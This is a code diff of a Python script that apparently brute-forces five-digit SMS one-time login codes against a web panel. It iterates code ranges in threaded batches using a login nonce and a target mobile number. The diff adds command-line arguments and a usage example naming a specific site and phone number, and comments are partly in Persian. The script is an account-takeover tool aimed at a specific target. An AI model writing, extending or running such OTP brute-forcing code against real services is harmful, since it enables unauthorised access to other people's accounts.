@@ -3,6 +3,7 @@ import json
 from http.cookiejar import MozillaCookieJar
 from concurrent.futures import ThreadPoolExecutor
 import time
+import sys
 
 def send_request(host, login_otp_nonce, mobile, code_values, counter, max_retries=1):
     headers = {
@@ -75,14 +76,19 @@ def generate_code(counter):
     code_str = f"{counter:05d}"
     return [int(digit) for digit in code_str]
 
-# Get user input
-host = input("Host: ")
-login_otp_nonce = input("login_otp_nonce: ")
-mobile = input("Mobile: ")
+# گرفتن آرگومان‌ها از خط فرمان
+if len(sys.argv) != 4:
+    print("Usage: python script_00000_25000.py <host> <login_otp_nonce> <mobile>")
+    print("Example: python script_00000_25000.py www.arzanpanel-iran.com 9d6178e07d 09039495749")
+    sys.exit(1)
 
-# Settings
+host = sys.argv[1]
+login_otp_nonce = sys.argv[2]
+mobile = sys.argv[3]
+
+# تنظیمات رنج
 start_range = 75000
-end_range = 100000
+end_range = 99999
 batch_size = 100
 
 found_success = False
